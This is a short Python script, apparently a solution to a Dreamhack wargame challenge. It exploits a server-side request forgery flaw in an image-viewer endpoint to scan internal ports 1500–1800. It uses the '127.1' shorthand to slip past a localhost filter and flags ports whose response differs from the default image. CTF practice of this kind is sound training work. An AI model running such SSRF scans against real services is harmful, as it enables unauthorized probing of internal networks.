import requests


img_src='iVBOR'
for port in range(1500,1801):
    query=f"http://host3.dreamhack.games:8235/img_viewer"
    data={
        "url":f"http://127.1:{port}"
        }
    response=requests.post(query,data=data)
    if img_src not in response.text:
        print(port)
